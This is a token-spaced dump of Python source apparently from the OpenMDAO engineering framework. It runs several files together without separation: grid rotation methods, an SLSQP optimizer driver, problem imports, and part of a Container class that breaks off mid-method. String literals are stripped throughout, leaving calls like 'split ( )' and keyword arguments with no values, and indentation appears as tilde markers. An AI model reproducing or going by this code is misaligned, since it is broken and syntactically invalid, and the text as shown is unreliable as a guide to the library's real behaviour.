~~~ self . grid_coordinates . rotate_about_x ( deg ) \n 
self . flow_solution . rotate_about_x ( deg ) \n 
~~ else : \n 
~~~ raise RuntimeError ( ) \n 
\n 
~~ ~~ def rotate_about_y ( self , deg ) : \n 
~~~ """\n        Rotate about the Y axis.\n\n        deg: float (degrees)\n            Amount of rotation.\n        """ \n 
if self . coordinate_system == CARTESIAN : \n 
~~~ self . grid_coordinates . rotate_about_y ( deg ) \n 
self . flow_solution . rotate_about_y ( deg ) \n 
~~ else : \n 
~~~ raise RuntimeError ( ) \n 
\n 
~~ ~~ def rotate_about_z ( self , deg ) : \n 
~~~ """\n        Rotate about the Z axis.\n\n        deg: float (degrees)\n            Amount of rotation.\n        """ \n 
if self . coordinate_system == CARTESIAN : \n 
~~~ self . grid_coordinates . rotate_about_z ( deg ) \n 
self . flow_solution . rotate_about_z ( deg ) \n 
~~ else : \n 
~~~ raise RuntimeError ( ) \n 
\n 
~~ ~~ def promote ( self ) : \n 
~~~ """ Promote from N-dimensional to N+1 dimensional index space. """ \n 
self . grid_coordinates . promote ( ) \n 
self . flow_solution . promote ( ) \n 
\n 
~~ def demote ( self ) : \n 
~~~ """ Demote from N-dimensional to N-1 dimensional index space. """ \n 
self . grid_coordinates . demote ( ) \n 
self . flow_solution . demote ( ) \n 
\n 
~~ ~~ """\nslsqpdriver.py - Contains a driver that wraps the SLSQP\noptimizer as used in pyOpt:\n\nMinimize a function using Sequential Least SQuares Programming.\n\nSLSQP is a gradient optimizer that can handle both equality and\ninequality constraints.\n""" \n 
\n 
# pylint: disable=E0611,F0401 \n 
from math import isnan \n 
from numpy import zeros , array \n 
\n 
from slsqp . slsqp import slsqp , closeunit , pyflush \n 
\n 
from openmdao . main . datatypes . api import Enum , Float , Int , Str \n 
from openmdao . main . driver_uses_derivatives import Driver \n 
from openmdao . main . hasparameters import HasParameters \n 
from openmdao . main . hasconstraints import HasConstraints \n 
from openmdao . main . hasobjective import HasObjective \n 
from openmdao . main . interfaces import IHasParameters , IHasConstraints , IHasObjective , implements , IOptimizer \n 
from openmdao . util . decorators import add_delegate \n 
\n 
\n 
@ add_delegate ( HasParameters , HasConstraints , HasObjective ) \n 
class SLSQPdriver ( Driver ) : \n 
~~~ """Minimize a function using the Sequential Least SQuares Programming\n    (SLSQP) method.\n\n    SLSQP is a gradient optimizer that can handle both equality and\n    inequality constraints.\n\n    Note: Constraints should be added using the OpenMDAO convention\n    (positive = violated).\n    """ \n 
\n 
implements ( IHasParameters , IHasConstraints , IHasObjective , IOptimizer ) \n 
\n 
# pylint: disable=E1101 \n 
accuracy = Float ( 1.0e-6 , iotype = , \n 
desc = ) \n 
\n 
maxiter = Int ( 50 , iotype = , \n 
desc = ) \n 
\n 
iprint = Enum ( 0 , [ 0 , 1 , 2 , 3 ] , iotype = , \n 
desc = ) \n 
\n 
iout = Int ( 6 , iotype = , \n 
desc = ) \n 
\n 
output_filename = Str ( , iotype = , \n 
desc = ) \n 
\n 
error_code = Int ( 0 , iotype = , \n 
desc = ) \n 
\n 
def __init__ ( self ) : \n 
\n 
~~~ super ( SLSQPdriver , self ) . __init__ ( ) \n 
\n 
self . error_messages = { \n 
- 1 : "Gradient evaluation required (g & a)" , \n 
1 : "Function evaluation required (f & c)" , \n 
2 : "More equality constraints than independent variables" , \n 
3 : "More than 3*n iterations in LSQ subproblem" , \n 
4 : "Inequality constraints incompatible" , \n 
5 : "Singular matrix E in LSQ subproblem" , \n 
6 : "Singular matrix C in LSQ subproblem" , \n 
7 : "Rank-deficient equality constraint subproblem HFTI" , \n 
8 : "Positive directional derivative for linesearch" , \n 
9 : "Iteration limit exceeded" , \n 
} \n 
\n 
self . x = zeros ( 0 , ) \n 
self . x_lower_bounds = zeros ( 0 , ) \n 
self . x_upper_bounds = zeros ( 0 , ) \n 
\n 
self . inputs = None \n 
self . obj = None \n 
self . con = None \n 
\n 
self . nparam = None \n 
self . ncon = None \n 
self . neqcon = None \n 
\n 
self . ff = 0 \n 
self . nfunc = 0 \n 
self . ngrad = 0 \n 
\n 
self . _continue = None \n 
\n 
~~ def start_iteration ( self ) : \n 
~~~ """Perform initial setup before iteration loop begins.""" \n 
\n 
# Inital run to make sure the workflow executes \n 
super ( SLSQPdriver , self ) . run_iteration ( ) \n 
\n 
self . inputs = self . list_param_group_targets ( ) \n 
self . obj = self . list_objective_targets ( ) \n 
self . con = self . list_constraint_targets ( ) \n 
\n 
self . nparam = self . total_parameters ( ) \n 
self . ncon = self . total_constraints ( ) \n 
self . neqcon = self . total_eq_constraints ( ) \n 
\n 
self . x = self . eval_parameters ( self . parent ) \n 
self . x_lower_bounds = self . get_lower_bounds ( ) \n 
self . x_upper_bounds = self . get_upper_bounds ( ) \n 
\n 
self . ff = 0 \n 
self . nfunc = 0 \n 
self . ngrad = 0 \n 
\n 
self . _continue = True \n 
\n 
~~ def run_iteration ( self ) : \n 
~~~ """ Note: slsqp controls the looping.""" \n 
\n 
n = self . nparam \n 
m = self . ncon \n 
meq = self . neqcon \n 
\n 
la = max ( m , 1 ) \n 
gg = zeros ( [ la ] , ) \n 
df = zeros ( [ n + 1 ] , ) \n 
dg = zeros ( [ la , n + 1 ] , ) \n 
\n 
mineq = m - meq + 2 * ( n + 1 ) \n 
lsq = ( n + 1 ) * ( ( n + 1 ) + 1 ) + meq * ( ( n + 1 ) + 1 ) + mineq * ( ( n + 1 ) + 1 ) \n 
lsi = ( ( n + 1 ) - meq + 1 ) * ( mineq + 2 ) + 2 * mineq \n 
lsei = ( ( n + 1 ) + mineq ) * ( ( n + 1 ) - meq ) + 2 * meq + ( n + 1 ) \n 
slsqpb = ( n + 1 ) * ( n / 2 ) + 2 * m + 3 * n + 3 * ( n + 1 ) + 1 \n 
lw = lsq + lsi + lsei + slsqpb + n + m \n 
w = zeros ( [ lw ] , ) \n 
ljw = max ( mineq , ( n + 1 ) - meq ) \n 
jw = zeros ( [ ljw ] , ) \n 
\n 
try : \n 
~~~ dg , self . error_code , self . nfunc , self . ngrad = slsqp ( self . ncon , self . neqcon , la , self . nparam , \n 
self . x , self . x_lower_bounds , self . x_upper_bounds , \n 
self . ff , gg , df , dg , self . accuracy , self . maxiter , \n 
self . iprint - 1 , self . iout , self . output_filename , \n 
self . error_code , w , lw , jw , ljw , \n 
self . nfunc , self . ngrad , \n 
self . _func , self . _grad ) \n 
\n 
#slsqp(m,meq,la,n,xx,xl,xu,ff,gg,df,dg,acc,maxit,iprint, \n 
#      iout,ifile,mode,w,lw,jw,ljw,nfunc,ngrad,slfunc,slgrad) \n 
\n 
~~ except Exception as err : \n 
~~~ self . _logger . error ( str ( err ) ) \n 
raise \n 
\n 
~~ if self . iprint > 0 : \n 
~~~ closeunit ( self . iout ) \n 
\n 
# Log any errors \n 
~~ if self . error_code != 0 : \n 
~~~ self . _logger . warning ( self . error_messages [ self . error_code ] ) \n 
\n 
# Iteration is complete \n 
~~ self . _continue = False \n 
\n 
~~ def _func ( self , m , me , la , n , f , g , xnew ) : \n 
~~~ """ Return ndarrays containing the function and constraint\n        evaluations.\n\n        Note: m, me, la, n, f, and g are unused inputs.""" \n 
self . set_parameters ( xnew ) \n 
super ( SLSQPdriver , self ) . run_iteration ( ) \n 
f = self . eval_objective ( ) \n 
\n 
if isnan ( f ) : \n 
~~~ msg = "Numerical overflow in the objective." \n 
self . raise_exception ( msg , RuntimeError ) \n 
\n 
# Constraints. Note that SLSQP defines positive as satisfied. \n 
~~ if self . ncon > 0 : \n 
~~~ g = - 1. * array ( self . eval_constraints ( self . parent ) ) \n 
\n 
~~ if self . iprint > 0 : \n 
~~~ pyflush ( self . iout ) \n 
\n 
~~ return f , g \n 
\n 
~~ def _grad ( self , m , me , la , n , f , g , df , dg , xnew ) : \n 
~~~ """ Return ndarrays containing the gradients of the objective\n        and constraints.\n\n        Note: m, me, la, n, f, and g are unused inputs.""" \n 
\n 
J = self . _calc_gradient ( self . inputs , self . obj + self . con ) \n 
#print "gradient", J \n 
df [ 0 : self . nparam ] = J [ 0 , : ] . ravel ( ) \n 
\n 
if self . ncon > 0 : \n 
~~~ dg [ 0 : self . ncon , 0 : self . nparam ] = - J [ 1 : 1 + self . ncon , : ] \n 
\n 
~~ return df , dg \n 
\n 
~~ def requires_derivs ( self ) : \n 
~~~ """SLSQP requires derivatives.""" \n 
return True \n 
~~ ~~ from sellar import SellarProblem , SellarProblemWithDeriv \n 
from branin import BraninProblem \n 
from scalable import UnitScalableProblem \n 
from polyscale import PolyScalableProblem """\nThe Container class.\n""" \n 
\n 
import datetime \n 
import copy \n 
import pprint \n 
import socket \n 
import sys \n 
import weakref \n 
# the following is a monkey-patch to correct a problem with \n 
# copying/deepcopying weakrefs There is an issue in the python issue tracker \n 
\n 
\n 
# pylint: disable=W0212 \n 
copy . _copy_dispatch [ weakref . ref ] = copy . _copy_immutable \n 
copy . _deepcopy_dispatch [ weakref . ref ] = copy . _deepcopy_atomic \n 
copy . _deepcopy_dispatch [ weakref . KeyedRef ] = copy . _deepcopy_atomic \n 
# pylint: enable=W0212 \n 
\n 
\n 
# pylint: disable=E0611,F0401 \n 
\n 
from zope . interface import Interface , implements \n 
\n 
from numpy import ndarray \n 
\n 
from traits . api import HasTraits , Missing , Python , push_exception_handler , TraitType , CTrait \n 
from traits . has_traits import FunctionType , _clone_trait , MetaHasTraits \n 
from traits . trait_base import not_none \n 
\n 
from multiprocessing import connection \n 
\n 
from openmdao . main . datatypes . file import FileRef \n 
from openmdao . main . datatypes . list import List \n 
from openmdao . main . datatypes . slot import Slot \n 
from openmdao . main . datatypes . vtree import VarTree \n 
from openmdao . main . interfaces import ICaseIterator , IResourceAllocator , IContainer , IVariableTree , IContainerProxy , IOverrideSet \n 
#from openmdao.main.index import get_indexed_value, deep_hasattr, \\ \n 
#INDEX, ATTR, SLICE, _index_functs \n 
from openmdao . main . mp_support import ObjectManager , is_instance , CLASSES_TO_PROXY , has_interface \n 
from openmdao . main . rbac import rbac \n 
from openmdao . main . variable import Variable , is_legal_name , _missing \n 
from openmdao . main . array_helpers import flattened_value , get_index \n 
\n 
from openmdao . util . log import Logger , logger \n 
from openmdao . util import eggloader , eggsaver , eggobserver \n 
from openmdao . util . eggsaver import SAVE_CPICKLE \n 
from openmdao . util . typegroups import int_types , complex_or_real_types \n 
\n 
_copydict = { \n 
: copy . deepcopy , \n 
: copy . copy \n 
} \n 
\n 
_iodict = { : , : } \n 
\n 
__missing__ = object ( ) \n 
\n 
def get_closest_proxy ( obj , pathname ) : \n 
~~~ """Returns a tuple of the form (val, restofpath), where val\n    is either the object specified by dotted name \'pathname\'\n    within obj, or the closest in-process proxy object that can be\n    resolved.  If val is a proxy, restofpath will contain the\n    remaining part of pathname needed to resolve the desired attribute\n    within the proxy.  Otherwise, val is the actual desired attribute\n    and restofpath is the empty string.\n    """ \n 
names = pathname . split ( ) \n 
\n 
i = 0 \n 
for name in names : \n 
~~~ if IContainerProxy . providedBy ( obj ) : \n 
~~~ return ( obj , . join ( names [ i : ] ) ) \n 
\n 
~~ try : \n 
~~~ obj = getattr ( obj , name ) \n 
~~ except AttributeError : \n 
~~~ break \n 
~~ i += 1 \n 
\n 
~~ return ( obj , . join ( names [ i : ] ) ) \n 
\n 
\n 
~~ def proxy_parent ( obj , pathname ) : \n 
~~~ """Returns a tuple of the form (par, restofpath), where par\n    is either the parent of the object specified by dotted name \'pathname\'\n    within obj, or the closest in-process proxy object that can be\n    resolved.  restofpath will contain the\n    remaining part of pathname needed to resolve the desired attribute\n    within the parent or proxy object.\n    """ \n 
names = pathname . split ( ) \n 
\n 
i = 0 \n 
for name in names [ : - 1 ] : \n 
~~~ if IContainerProxy . providedBy ( obj ) : \n 
~~~ return ( obj , . join ( names [ i : ] ) ) \n 
\n 
~~ try : \n 
~~~ obj = getattr ( obj , name ) \n 
~~ except AttributeError : \n 
~~~ break \n 
~~ i += 1 \n 
\n 
~~ return ( obj , . join ( names [ i : ] ) ) \n 
\n 
\n 
# this causes any exceptions occurring in trait handlers to be re-raised. \n 
# Without this, the default behavior is for the exception to be logged and not \n 
# re-raised. \n 
~~ push_exception_handler ( handler = lambda o , t , ov , nv : None , \n 
reraise_exceptions = True , \n 
main = True , \n 
locked = True ) \n 
\n 
\n 
class _MetaSafe ( MetaHasTraits ) : \n 
~~~ """ Tries to keep users from shooting themselves in the foot. """ \n 
\n 
def __new__ ( mcs , class_name , bases , class_dict ) : \n 
\n 
~~~ for name , obj in class_dict . items ( ) : \n 
~~~ if isinstance ( obj , Variable ) : \n 
~~~ for base in bases : \n 
~~~ if name in base . __dict__ : \n 
~~~ raise NameError ( \n 
% ( class_name , name , base . __name__ ) ) \n 
~~ ~~ ~~ ~~ return super ( _MetaSafe , mcs ) . __new__ ( mcs , class_name , bases , class_dict ) \n 
\n 
\n 
~~ ~~ class SafeHasTraits ( HasTraits ) : \n 
~~~ """\n    Special :class:`HasTraits` which is configured such that the class is\n    checked for any :class:`Variable` which might override an existing\n    attribute in any base class.\n    """ \n 
# Doing this in Container breaks implements(IContainer) such that \n 
# implementedBy() would return False. \n 
__metaclass__ = _MetaSafe \n 
\n 
\n 
~~ def _check_bad_default ( name , trait , obj = None ) : \n 
~~~ if trait . vartypename not in [ , ] and trait . required is True and not trait . assumed_default and trait . _illegal_default_ is True : \n 
\n 
~~~ msg = "variable \'%s\' is required and cannot have a default value" % name \n 
if obj is None : \n 
~~~ raise RuntimeError ( msg ) \n 
~~ else : \n 
~~~ obj . raise_exception ( msg , RuntimeError ) \n 
\n 
\n 
~~ ~~ ~~ class Container ( SafeHasTraits ) : \n 
~~~ """ Base class for all objects having Traits that are visible\n    to the framework""" \n 
\n 
implements ( IContainer ) \n 
\n 
def __init__ ( self ) : \n 
~~~ self . _parent = None # Define these now for easier debugging during \n 
self . _name = None # deepcopy operations of superclass. \n 
super ( Container , self ) . __init__ ( ) \n 
\n 
self . _call_cpath_updated = True \n 
self . _call_configure = True \n 
\n 
self . _managers = { } # Object manager for remote access by authkey. \n 
\n 
# for keeping track of dynamically added traits for serialization \n 
self . _added_traits = { } \n 
\n 
# keep track of compiled expressions to save some overhead \n 
self . _getcache = { } \n 
self . _setcache = { } \n 
self . _copycache = { } \n 
\n 
self . _cached_traits_ = None \n 
self . _repair_trait_info = None \n 
\n 
# Locally set metadata, overrides trait metadata. \n 
self . _trait_metadata = { } \n 
\n 
# TODO: see about turning this back into a regular logger and just \n 
# handling its unpickleability in __getstate__/__setstate__ in \n 
# order to avoid the extra layer of function calls when logging \n 
self . _logger = Logger ( ) \n 
\n 
# Create per-instance initial FileRefs for File traits. There ought \n 
# to be a better way to not share default initial values, but \n 
\n 
for name , obj in self . items ( ) : \n 
~~~ if isinstance ( obj , FileRef ) : \n 
~~~ setattr ( self , name , obj . copy ( owner = self ) ) \n 
\n 
# Similarly, create per-instance VariableTrees for VarTree traits. \n 
~~ ~~ for name , obj in self . __class__ . __dict__ [ ] . items ( ) : \n 
~~~ ttype = obj . trait_type \n 
if isinstance ( ttype , VarTree ) : \n 
~~~ variable_tree = getattr ( self , name ) \n 
if not obj . required : \n 
~~~ new_tree = variable_tree . copy ( ) \n 
setattr ( self , name , new_tree ) \n 
\n 
~~ ~~ if obj . required : \n 
~~~ _check_bad_default ( name , obj , self ) \n 
\n 
~~ ~~ ~~ @ property \n 
def parent ( self ) : \n 
~~~ """The parent Container of this Container.""" \n 
return self . _parent \n 
\n 
~~ @ parent . setter \n 
def parent ( self , value ) : \n 
~~~ """This is called when the parent attribute is changed.""" \n 
if self . _parent is not value : \n 
~~~ self . _parent = value \n 
self . _fix_loggers ( self , recurse = True ) \n 
self . _branch_moved ( ) \n 
\n 
~~ ~~ def _branch_moved ( self ) : \n 
~~~ self . _call_cpath_updated = True \n 
for n , cont in self . items ( ) : \n 
~~~ if is_instance ( cont , Container ) and cont is not self . _parent : \n 
~~~ cont . _branch_moved ( ) \n 
\n 
~~ ~~ ~~ @ property \n 
def name ( self ) : \n 
~~~ """The name of this Container.""" \n 
if self . _name is None : \n 
~~~ if self . parent : \n 
~~~ self . _name = find_name ( self . parent , self ) \n 
self . _fix_loggers ( self , recurse = True ) \n 
~~ elif self . _call_cpath_updated is False : \n 
~~~ self . _name = \n 
~~ else : \n 
~~~ return \n 
~~ ~~ return self . _name \n 
\n 
~~ @ name . setter \n 
def name ( self , name ) : \n 
~~~ """Sets the name of this Container.""" \n 
if not is_legal_name ( name ) : \n 
~~~ raise NameError ( "name \'%s\' contains illegal characters" % name ) \n 
~~ if self . _name != name : \n 
~~~ self . _name = name \n 
self . _fix_loggers ( self , recurse = True ) \n 
\n 
~~ ~~ def _fix_loggers ( self , container , recurse ) : \n 
~~~ """Fix loggers starting from `container`.""" \n 
container . _logger . rename ( container . get_pathname ( ) . replace ( , ) ) \n 
if recurse : \n 
~~~ for name in container . list_containers ( ) : \n 
~~~ obj = getattr ( container , name ) \n 
self . _fix_loggers ( obj , recurse ) \n 
\n 
~~ ~~ ~~ @ rbac ( ( , ) ) \n 
def get_pathname ( self , rel_to_scope = None ) : \n 
~~~ """ Return full path name to this container, relative to scope\n        *rel_to_scope*. If *rel_to_scope* is *None*, return the full pathname.\n        """ \n 
path = [ ] \n 
obj = self \n 
name = obj . name \n 
while obj is not rel_to_scope and name : \n 
~~~ path . append ( name ) \n 
obj = obj . parent \n 
if obj is None : \n 
~~~ break \n 
~~ name = obj . name \n 
~~ return . join ( path [ : : - 1 ] ) \n 
\n 
~~ def get_trait ( self , name , copy = False ) : \n 
~~~ """Returns the trait indicated by name, or None if not found. No\n        recursive search is performed if name contains dots. This is a\n        replacement for the trait() method on HasTraits objects because that\n        method can return traits that shouldn\'t exist. DO NOT use the trait()\n        function as a way to determine the existence of a trait.\n        """ \n 
if self . _cached_traits_ is None : \n 
~~~ self . _cached_traits_ = self . traits ( ) \n 
self . _cached_traits_ . update ( self . _instance_traits ( ) ) \n 
~~ if copy : \n 
~~~ if self . _cached_traits_ . get ( name ) : \n 
~~~ return self . trait ( name , copy = copy ) \n 
~~ else : \n 
~~~ return None \n 
~~ ~~ else : \n 
~~~ return self . _cached_traits_ . get ( name ) \n 
\n 
# \n 
#  HasTraits overrides \n 
# \n 
\n 
~~ ~~ def __deepcopy__ ( self , memo ) : \n 
~~~ """ Overrides deepcopy for HasTraits because otherwise we lose instance\n        traits when we copy. :(\n        """ \n 
id_self = id ( self ) \n 
if id_self in memo : \n 
~~~ return memo [ id_self ] \n 
\n 
# Make sure HasTraits is performing all deepcopies. We need this \n 
# in order for our sub-components and objects to get deep-copied. \n 
~~ memo [ ] = "deep" \n 
\n 
saved_p = self . _parent \n 
saved_c = self . _cached_traits_ \n 
saved_s = self . _setcache \n 
saved_g = self . _getcache \n 
self . _parent = None \n 
self . _cached_traits_ = None \n 
self . _getcache = { } \n 
self . _setcache = { } \n 
try : \n 
~~~ result = super ( Container , self ) . __deepcopy__ ( memo ) \n 
~~ finally : \n 
~~~ self . _parent = saved_p \n 
self . _cached_traits_ = saved_c \n 
self . _getcache = saved_g \n 
self . _setcache = saved_s \n 
\n 
# Instance traits are not created properly by deepcopy, so we need \n 
# to manually recreate them. Note, self._added_traits is the most \n 
# accurate listing of them. Self._instance_traits includes some \n 
# extra stuff. \n 
~~ olditraits = self . _instance_traits ( ) \n 
for name , trait in olditraits . items ( ) : \n 
~~~ if trait . type is not and name in self . _added_traits : \n 
~~~ if isinstance ( trait . trait_type , VarTree ) : \n 
~~~ if name not in result . _added_traits : \n 
~~~ result . add_trait ( name , _clone_trait ( trait ) ) \n 
~~ ~~ else : \n 
~~~ result . add_trait ( name , _clone_trait ( trait ) ) \n 
~~ if name in self . __dict__ : # Not true with VarTree \n 
~~~ result . __dict__ [ name ] = copy . deepcopy ( self . __dict__ [ name ] ) \n 
\n 
~~ ~~ ~~ return result \n 
\n 
~~ def __getstate__ ( self ) : \n 
~~~ """Return dict representing this container\'s state.""" \n 
state = super ( Container , self ) . __getstate__ ( ) \n 
dct = { } \n 
for name , trait in state [ ] . items ( ) : \n 
~~~ if trait . transient is not True : \n 
~~~ dct [ name ] = trait \n 
\n 
~~ ~~ state [ ] = dct \n 
state [ ] = None \n 
state [ ] = { } \n 
state [ ] = { } \n 
return state \n 
\n 
~~ def __setstate__ ( self , state ) : \n 
~~~ """Restore this container\'s state. Components that need to do some\n        restore operations (such as connecting to a remote server or loading\n        a model file) before any get()/set() is attempted will generate\n        exceptions. However, the complete set of local traits must be available\n        since restore operations may depend on knowing what to restore.\n\n        Here we swallow errors from \'special\' components and remember to retry\n        the operation in _repair_traits(), called by post_load(). Persistent\n        problems will be reported there.\n        """ \n 
super ( Container , self ) . __setstate__ ( { } ) \n 
self . __dict__ . update ( state ) \n 
self . _repair_trait_info = { } \n 
\n 
\n 
# to get restored automatically \n 
self . _cached_traits_ = None \n 
traits = self . _alltraits ( ) \n 
for name , trait in self . _added_traits . items ( ) : \n 
~~~ if name not in traits : \n 
~~~ self . add_trait ( name , trait , refresh = False ) \n 
\n 
# Fix property traits that were not just added above. \n 
\n 
~~ ~~ fixups = [ ] \n 
for name , trait in traits . items ( ) : \n 
~~~ try : \n 
~~~ get = trait . trait_type . get \n 
~~ except AttributeError : \n 
~~~ continue \n 
~~ if get is not None : \n 
~~~ if name not in self . _added_traits : \n 
~~~ try : \n 
~~~ val = getattr ( self , name ) \n 
self . remove_trait ( name ) \n 
self . add_trait ( name , trait ) \n 
setattr ( self , name , val ) \n 
~~ except Exception as exc : \n 
~~~ self . _logger . warning ( , \n 
name , val , exc ) \n 
fixups . append ( ( name , trait ) ) \n 
~~ ~~ ~~ ~~ self . _repair_trait_info [ ] = fixups \n 
\n 
# after unpickling, implicitly defined traits disappear, so we have to \n 
# recreate them by assigning them to themselves. \n 
\n 
#      do this... \n 
fixups = [ ] \n 
for name , val in self . __dict__ . items ( ) : \n 
~~~ if not name . startswith ( ) and not self . get_trait ( name ) : \n 
~~~ try : \n 
~~~ setattr ( self , name , val ) # force def of implicit trait \n 
~~ except Exception as exc : \n 
~~~ self . _logger . warning ( , \n 
name , val , exc ) \n 
fixups . append ( ( name , val ) ) \n 
~~ ~~ ~~ self . _repair_trait_info [ ] = fixups \n 
\n 
# Fix List traits so they can be deepcopied. \n 
\n 
fixups = [ ] \n 
for name , trait in self . _alltraits ( ) . items ( ) : \n 
~~~ if isinstance ( trait . trait_type , List ) : \n 
~~~ try : \n 
~~~ setattr ( self , name , getattr ( self , name ) ) \n 
~~ except Exception as exc : \n 
~~~ self . _logger . warning ( , \n 
name , val , exc ) \n 
fixups . append ( name ) \n 
~~ ~~ ~~ self . _repair_trait_info [ ] = fixups \n 
\n 
self . _cached_traits_ = None \n 
\n 
~~ def _repair_traits ( self ) : \n 
~~~ """To be called after loading a pickled state, but *after* any\n        post_load() processing (to handle cases where a component needs\n        to do internal setup before being used to get/set a trait).\n        This retries failed operations recorded in __setstate__().\n        """ \n 
if self . _repair_trait_info is None : \n 
\n 
~~~ return \n 
\n 
~~ for name , trait in self . _repair_trait_info [ ] : \n 
~~~ val = getattr ( self , name ) \n 
self . remove_trait ( name ) \n 
self . add_trait ( name , trait ) \n 
setattr ( self , name , val ) \n 
\n 
~~ for name , val in self . _repair_trait_info [ ] : \n 
~~~ setattr ( self , name , val ) \n 
\n 
~~ for name in self . _repair_trait_info [ ] : \n 
~~~ setattr ( self , name , getattr ( self , name ) ) \n 
\n 
~~ self . _repair_trait_info = None \n 
\n 
~~ @ classmethod \n 
def add_class_trait ( cls , name , * trait ) : \n 
~~~ """Overrides HasTraits definition of *add_class_trait* to\n        try to keep from clobbering framework stuff.\n        """ \n 
bases = [ cls ] \n 
bases . extend ( cls . __bases__ ) \n 
for base in bases : \n 
~~~ if name in base . __dict__ : \n 
~~~ raise NameError ( \n 
% ( name , base . __name__ ) ) \n 
\n 
~~ ~~ for t in trait : \n 
~~~ _check_bad_default ( name , t ) \n 
break # just check the first arg in the list \n 
\n 
~~ if name in cls . _trait_metadata : \n 
~~~ del cls . _trait_metadata [ name ] # Invalidate. \n 
\n 
~~ return super ( Container , cls ) . add_class_trait ( name , * trait ) \n 
\n 
~~ def add_trait ( self , name , trait , refresh = True ) : \n 
~~~ """Overrides HasTraits definition of *add_trait* in order to\n        keep track of dynamically added traits for serialization.\n        """ \n 
# When a trait with sub-traits is added (like a List or Dict), \n 
# HasTraits calls add_trait AGAIN for the sub-trait, so we \n 
# just detect it here and pass it through \n 
if name . endswith ( ) and trait . type == : \n 
~~~ super ( Container , self ) . add_trait ( name , trait ) \n 
return \n 
\n 
# Try to keep from clobbering framework stuff. \n 
~~ bases = [ self . __class__ ] \n 
bases . extend ( self . __class__ . __bases__ ) \n 
for base in bases : \n 
~~~ if name in base . __dict__ : \n 
~~~ raise NameError ( \n 
% ( name , base . __name__ ) ) \n 
\n 
~~ ~~ _check_bad_default ( name , trait , self ) \n 
\n 
\n 
if name not in self . _added_traits : \n 
~~~ self . _added_traits [ name ] = trait \n 
~~ super ( Container , self ) . add_trait ( name , trait ) \n 
if self . _cached_traits_ is not None : \n 
~~~ self . _cached_traits_ [ name ] = self . trait ( name ) \n 
\n 
~~ if name in self . _trait_metadata : \n 
~~~ del self . _trait_metadata [ name ] # Invalidate. \n 
\n 
~~ if refresh : \n 
~~~ getattr ( self , name ) # For VariableTree subtree/leaf update in GUI. \n 
\n 
~~ ~~ def remove_trait ( self , name ) : \n 
~~~ """Overrides HasTraits definition of remove_trait in order to\n        keep track of dynamically added traits for serialization.\n        """ \n 
try : \n 
~~~ del self . _added_traits [ name ] \n 
~~ except KeyError : \n 
~~~ pass \n 
~~ try : \n 
~~~ del self . _cached_traits_ [ name ] \n 
~~ except ( KeyError , TypeError ) : \n 
~~~ pass \n 
~~ try : \n 
~~~ del self . _trait_metadata [ name ] \n 
~~ except KeyError : \n 
~~~ pass \n 
\n 
~~ super ( Container , self ) . remove_trait ( name ) \n 
\n 
~~ @ rbac ( ( , ) ) \n 
def get_attr_w_copy ( self , path ) : \n 
~~~ """Same as the \'get\' method, except that the value will be copied\n        if the variable has a \'copy\' metadata attribute that is not None.\n        Possible values for \'copy\' are \'shallow\' and \'deep\'.\n        Raises an exception if the variable cannot be found.\n\n        """ \n 
obj = self . get ( path ) \n 
\n 
copy = self . _copycache . get ( path , _missing ) \n 
if copy is _missing : \n 
~~~ copy = self . get_metadata ( path . split ( , 1 ) [ 0 ] , ) \n 
self . _copycache [ path ] = copy \n 
\n 
\n 
~~ if copy : \n 
~~~ if isinstance ( obj , Container ) : \n 
~~~ obj = obj . copy ( ) \n 
~~ else : \n 
~~~ obj = _copydict [ copy ] ( obj ) \n 
\n 
~~ ~~ return obj \n 
\n 
~~ def _add_after_parent_set ( self , name , obj ) : \n 
~~~ pass \n 
\n 
~~ def _prep_for_add ( self , name , obj ) : \n 
~~~ """Check for illegal adds and update the new child\n        object in preparation for insertion into self.\n        """ \n 
if in name : \n 
~~~ self . raise_exception ( \n 
% \n 
name , ValueError ) \n 
~~ elif not is_legal_name ( name ) : \n 
~~~ self . raise_exception ( "\'%s\' is a reserved or invalid name" % name , \n 
NameError ) \n 
\n 
~~ removed = False \n 
if has_interface ( obj , IContainer ) : \n 
# if an old child with that name exists, remove it \n 
~~~ if self . contains ( name ) and getattr ( self , name ) : \n 
~~~ self . remove ( name ) \n 
removed = True \n 
\n 
~~ ~~ if has_interface ( obj , IContainer ) : \n 
~~~ self . _check_recursion ( obj ) \n 
if IContainerProxy . providedBy ( obj ) : \n 
~~~ obj . parent = self . _get_proxy ( obj ) \n 
~~ else : \n 
~~~ obj . parent = self \n 
~~ obj . name = name \n 
\n 
self . _add_after_parent_set ( name , obj ) \n 
\n 
# if this object is already installed in a hierarchy, then go \n 
# ahead and tell the obj (which will in turn tell all of its \n 
# children) that its scope tree back to the root is defined. \n 
if self . _call_cpath_updated is False : \n 
~~~ obj . cpath_updated ( ) \n 
\n 
~~ ~~ return removed \n 
\n 
~~ def _post_container_add ( self , name , obj , removed ) : \n 
~~~ pass \n 
\n 
~~ def add ( self , name , obj ) : \n 
~~~ """Add an object to this Container.\n        Returns the added object.\n        """ \n 
removed = self . _prep_for_add ( name , obj ) \n 
\n 
if has_interface ( obj , IContainer ) : \n 
~~~ setattr ( self , name , obj ) \n 
\n 
if self . _cached_traits_ is None : \n 
~~~ self . get_trait ( name ) \n 
~~ else : \n 
~~~ self . _cached_traits_ [ name ] = self . trait ( name ) \n 
\n 
~~ self . _post_container_add ( name , obj , removed ) \n 
\n 
~~ elif is_instance ( obj , TraitType ) : \n 
~~~ self . add_trait ( name , obj ) \n 
~~ else : \n 
~~~ setattr ( self , name , obj ) \n 
\n 
~~ return obj \n 
\n 
~~ def _check_recursion ( self , obj ) : \n 
~~~ """ Check if adding `obj` will cause container recursion. """ \n 
ancestor = self \n 
while is_instance ( ancestor , Container ) : \n 
~~~ if obj is ancestor : \n 
~~~ self . raise_exception ( , \n 
ValueError ) \n 
~~ ancestor = ancestor . parent \n 
\n 
~~ ~~ def _get_proxy ( self , proxy ) : \n 
~~~ """\n        Return :class:`OpenMDAO_Proxy` for self usable by `proxy`.\n        We create a manager for each access type.\n        In addition, to avoid having to (remotely) manipulate a server\'s\n        `allowed_hosts`, we use a separate manager for each client accessing\n        via AF_INET from a unique host.\n        """ \n 
addr_type = connection . address_type ( proxy . _token . address ) \n 
addr = proxy . _token . address [ 0 ] if addr_type == else None \n 
key = ( addr_type , addr , proxy . _authkey ) \n 
try : \n 
~~~ manager = self . _managers [ key ] \n 
~~ except KeyError : \n 
~~~ if addr_type == : \n 
~~~ ip_addr = socket . gethostbyname ( socket . gethostname ( ) ) \n 
address = ( ip_addr , 0 ) \n 
allowed_hosts = [ addr ] \n 
if addr == ip_addr : \n 
